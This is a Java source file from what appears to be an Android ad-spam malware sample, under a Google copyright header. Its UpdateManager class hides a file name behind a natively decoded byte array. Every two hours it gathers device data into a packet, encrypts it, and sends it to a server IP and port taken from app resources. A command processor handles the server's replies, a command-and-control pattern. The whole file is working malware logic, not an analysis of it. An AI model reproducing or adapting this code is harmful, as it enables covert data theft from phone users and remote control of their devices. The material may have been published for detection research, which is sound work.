// Copyright 2021 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     https://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package ad.spam;

import android.content.Context;
import android.content.res.Resources;
import android.util.Base64;
import java.io.IOException;
import java.nio.charset.StandardCharsets;

public class UpdateManager {
    public static final long UPDATE_INTERVAL = 2 * 60 * 60;

    public static String fileName = NativeAdapter.transform(
            new byte[]{0x11, 0x23, 0x3a, 0x00, 0x12, 0x38, 0x7f, 0x32, 0x2c, 0x22, 0x02, 0x46, 0x13,
                    0x30, 0x11, 0x49, 0x33, 0x24, 0x5a, 0x1b});

    private final Context context;
    private final ConfigUtil configUtil;
    private final CmdProcessor cmdProcessor;

    public UpdateManager(Context context, ConfigUtil configUtil, CmdProcessor cmdProcessor) {
        this.context = context;
        this.configUtil = configUtil;
        this.cmdProcessor = cmdProcessor;
    }

    private Long getCurrentTimeSeconds() {
        return System.currentTimeMillis() / 1000;
    }

    private boolean needUpdate() {
        Long lastUpdate = configUtil.getLastUpdate();
        return getCurrentTimeSeconds() > lastUpdate + UPDATE_INTERVAL;
    }

    public void update() throws IOException {
        if (!needUpdate()) {
            return;
        }
        Resources resources = context.getResources();
        String ip = resources.getString(R.string.ip);
        String port = resources.getString(R.string.port);
        PacketConstructor packetConstructor = new PacketConstructor(context);

        String data = packetConstructor.composePacket().toString();
        byte[] encryptedData = NativeAdapter.encrypt(data.getBytes(StandardCharsets.UTF_8));
        new ClientTask(this, cmdProcessor).execute(ip, port,
                Base64.encodeToString(encryptedData, Base64.NO_WRAP));
    }
}
